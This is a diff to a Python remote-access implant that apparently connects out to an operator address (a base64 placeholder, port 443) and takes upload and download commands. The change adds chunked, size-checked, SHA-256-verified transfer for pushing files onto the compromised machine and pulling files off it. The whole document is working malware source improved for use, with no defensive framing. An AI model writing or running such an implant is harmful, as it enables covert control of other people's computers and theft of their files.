@@ -1,4 +1,4 @@
-import socket, subprocess, time, os, sys, base64, shutil, ssl
+import socket, subprocess, time, os, sys, base64, shutil, ssl, hashlib
 
 v_h = base64.b64decode("YOUR_IP_BASE64_HERE").decode()
 v_p = 443
@@ -54,16 +54,29 @@ def start_session():
                 if d.startswith("__UPLOAD__:"):
                     f_path = d.split(":", 1)[1]
                     c.send(b"READY")
-                    f_data = c.recv(1024 * 1024)
-                    with open(f_path, "wb") as f: f.write(f_data)
-                    c.send(b"[+] OK")
+                    size_data = c.recv(1024).decode()
+                    if size_data.startswith("SIZE:"):
+                        size = int(size_data.split(":")[1])
+                        c.send(b"OK")
+                        f_data = b""
+                        while len(f_data) < size:
+                            chunk = c.recv(min(4096, size - len(f_data)))
+                            if not chunk: break
+                            f_data += chunk
+                        with open(f_path, "wb") as f: f.write(f_data)
+                        local_hash = hashlib.sha256(f_data).hexdigest()
+                        c.send(local_hash.encode())
 
                 elif d.startswith("__DOWNLOAD__:"):
                     f_path = d.split(":", 1)[1]
                     if os.path.exists(f_path):
-                        c.send(f"SIZE:{os.path.getsize(f_path)}".encode())
+                        with open(f_path, "rb") as f: file_data = f.read()
+                        file_hash = hashlib.sha256(file_data).hexdigest()
+                        c.send(f"SIZE:{len(file_data)}".encode())
                         if c.recv(1024).decode() == "OK":
-                            with open(f_path, "rb") as f: c.send(f.read())
+                            c.send(file_data)
+                            c.recv(1024)
+                            c.send(file_hash.encode())
                     else:
                         c.send(b"ERROR")
 
